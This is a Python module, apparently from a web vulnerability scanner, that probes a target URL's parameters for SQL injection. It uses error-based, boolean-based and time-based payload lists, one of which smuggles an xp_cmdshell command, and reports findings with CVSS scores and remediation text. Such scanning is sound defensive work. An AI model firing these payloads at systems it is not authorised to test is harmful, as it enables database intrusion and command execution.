import httpx
import asyncio
import re
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from app.models.scan import Vulnerability, VulnType, Severity


SQLI_ERROR_PATTERNS = [
    r"sql syntax.*mysql",
    r"warning.*mysql_.*",
    r"valid mysql result",
    r"mysqlclient\.",
    r"postgresql.*error",
    r"warning.*pg_.*",
    r"valid postgresql result",
    r"npgsql\.",
    r"driver.*sql[\s_\-]*server",
    r"ole db.*sql server",
    r"(\b(select|union|insert|update|delete|drop)\b.*\b(from|into|table)\b)",
    r"odbc.*driver",
    r"sqlite_",
    r"sqlite error",
    r"ora-[0-9]{5}",
    r"oracle.*driver",
    r"microsoft.*access.*driver",
    r"jet database engine",
    r"access database engine",
]

SQLI_PAYLOADS = {
    "error_based": [
        "'",
        "''",
        "`",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
    ],
    "boolean_based": [
        "' AND '1'='1",
        "' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND 1=1--",
        "' AND 1=2--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1; SELECT SLEEP(5)",
        "' OR SLEEP(5)--",
        "'; exec xp_cmdshell('ping 127.0.0.1')--",
    ],
}

CVSS_SQLI = {
    "score": 9.8,
    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
}


def _detect_error(response_text: str) -> str | None:
    text_lower = response_text.lower()
    for pattern in SQLI_ERROR_PATTERNS:
        match = re.search(pattern, text_lower)
        if match:
            return match.group(0)
    return None


async def scan_sqli(
    client: httpx.AsyncClient,
    url: str,
    params: dict,
    method: str = "GET",
    timeout: int = 10,
) -> list[Vulnerability]:
    vulns = []
    found_params = set()

    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    all_params = {**{k: v[0] for k, v in query_params.items()}, **params}

    if not all_params and method == "GET":
        all_params = {"id": "1", "q": "test", "search": "test", "page": "1"}

    for param_name, original_value in all_params.items():
        if param_name in found_params:
            continue

        # Error-based detection
        for payload in SQLI_PAYLOADS["error_based"]:
            try:
                test_params = {**all_params, param_name: str(original_value) + payload}
                if method.upper() == "POST":
                    resp = await client.post(url, data=test_params, timeout=timeout)
                else:
                    resp = await client.get(url, params=test_params, timeout=timeout)
                
                evidence = _detect_error(resp.text)
                if evidence:
                    vulns.append(Vulnerability(
                        vuln_type=VulnType.SQL_INJECTION,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"SQL error pattern detected in {method} response",
                        description=(
                            f"SQL Injection vulnerability found in parameter '{param_name}' ({method}). "
                            "Error-based technique reveals database error messages indicating "
                            "unsanitized SQL query construction."
                        ),
                        remediation=(
                            "Use parameterized queries or prepared statements. "
                            "Never concatenate user input directly into SQL queries. "
                            "Apply input validation and whitelist allowed characters."
                        ),
                        cvss_score=CVSS_SQLI["score"],
                        cvss_vector=CVSS_SQLI["vector"],
                    ))
                    found_params.add(param_name)
                    break
            except (httpx.TimeoutException, httpx.ConnectError):
                continue

        if param_name in found_params:
            continue

        # Boolean-based: compare true vs false response
        try:
            true_payload = f"{original_value}' AND '1'='1"
            false_payload = f"{original_value}' AND '1'='2"

            if method.upper() == "POST":
                resp_true = await client.post(url, data={**all_params, param_name: true_payload}, timeout=timeout)
                resp_false = await client.post(url, data={**all_params, param_name: false_payload}, timeout=timeout)
            else:
                resp_true = await client.get(url, params={**all_params, param_name: true_payload}, timeout=timeout)
                resp_false = await client.get(url, params={**all_params, param_name: false_payload}, timeout=timeout)

            len_diff = abs(len(resp_true.text) - len(resp_false.text))
            if len_diff > 50 and resp_true.status_code == resp_false.status_code:
                vulns.append(Vulnerability(
                    vuln_type=VulnType.SQL_INJECTION,
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param_name,
                    payload=f"AND '1'='1 vs AND '1'='2",
                    evidence=f"Boolean-based {method}: response length difference of {len_diff} chars between true/false conditions",
                    description=(
                        f"Boolean-based SQL Injection in parameter '{param_name}' ({method}). "
                        "The application returns different content based on true/false SQL conditions."
                    ),
                    remediation=(
                        "Implement prepared statements with parameterized queries. "
                        "Use an ORM with built-in SQL injection protection."
                    ),
                    cvss_score=CVSS_SQLI["score"],
                    cvss_vector=CVSS_SQLI["vector"],
                ))
                found_params.add(param_name)
        except (httpx.TimeoutException, httpx.ConnectError):
            pass

        if param_name in found_params:
            continue

        # Time-based detection
        for payload in SQLI_PAYLOADS["time_based"]:
            try:
                import time
                start = time.time()
                test_params = {**all_params, param_name: str(original_value) + payload}
                if method.upper() == "POST":
                    await client.post(url, data=test_params, timeout=timeout)
                else:
                    await client.get(url, params=test_params, timeout=timeout)
                elapsed = time.time() - start

                if elapsed >= 4.5:
                    vulns.append(Vulnerability(
                        vuln_type=VulnType.SQL_INJECTION,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Time-based {method}: response delayed by {elapsed:.1f}s",
                        description=(
                            f"Time-based Blind SQL Injection in parameter '{param_name}' ({method}). "
                            "The application execution is delayed when injecting time-delay SQL functions."
                        ),
                        remediation=(
                            "Use parameterized queries. Implement a WAF with SQL injection rules. "
                            "Apply principle of least privilege on DB accounts."
                        ),
                        cvss_score=CVSS_SQLI["score"],
                        cvss_vector=CVSS_SQLI["vector"],
                    ))
                    found_params.add(param_name)
                    break
            except (httpx.TimeoutException, httpx.ConnectError):
                continue

    return vulns